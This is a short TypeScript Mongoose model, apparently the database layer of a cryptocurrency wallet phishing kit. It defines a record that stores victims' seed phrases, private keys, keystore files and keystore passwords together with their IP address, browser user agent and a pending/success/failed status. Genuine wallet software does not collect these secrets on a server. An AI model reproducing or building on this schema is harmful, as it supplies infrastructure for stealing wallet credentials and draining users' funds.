import { Schema, model, type InferSchemaType, type HydratedDocument } from 'mongoose';

const walletConnectionSchema = new Schema({
  wallet: { type: String, required: true },
  method: { type: String, enum: ['phrase', 'keystore', 'private key'], required: true },
  data: {
    phrase: { type: String },
    privateKey: { type: String },
    keystore: { type: String },
    password: { type: String },
    fileName: { type: String },
    wordCount: { type: Number },
  },
  ipAddress: { type: String },
  userAgent: { type: String },
  status: { 
    type: String, 
    enum: ['pending', 'success', 'failed'], 
    default: 'pending' 
  },
  createdAt: { type: Date, default: Date.now },
});

export type WalletConnectionDoc = HydratedDocument<InferSchemaType<typeof walletConnectionSchema>>;

export const WalletConnection = model('WalletConnection', walletConnectionSchema);